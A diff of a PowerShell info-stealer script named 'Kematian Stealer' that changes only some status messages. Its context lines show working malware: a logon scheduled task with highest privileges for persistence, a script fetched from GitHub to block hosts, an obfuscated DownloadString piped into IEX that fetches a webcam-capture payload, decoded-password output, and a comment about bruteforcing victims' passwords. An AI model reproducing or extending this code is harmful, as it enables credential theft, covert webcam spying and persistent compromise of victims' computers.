@@ -6,7 +6,6 @@ $melt = $false
 $fakeerror = $false
 $persistence = $true
 
-
 if ($debug) {
     $ProgressPreference = 'Continue'
 }
@@ -90,7 +89,7 @@ function Invoke-TASKS {
         $task_trigger = New-ScheduledTaskTrigger -AtLogOn
         $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
         Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Kematian" -RunLevel Highest -Force | Out-Null
-        Write-Host "[!] Task Created" -ForegroundColor Green
+        Write-Host "[!] Persistence Added" -ForegroundColor Green
     }
     if ($blockhostsfile) {
         $link = "https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/blockhosts.ps1"
@@ -716,7 +715,6 @@ Pass: $decodedPass
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$webcam')"
     $invokewebcam = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
     $invokewebcam.WaitForExit()
-    Write-Host "[!] Webcam captured !" -ForegroundColor Green
 
     # Works since most victims will have a weak password which can be bruteforced
     #function ExportPrivateKeys {
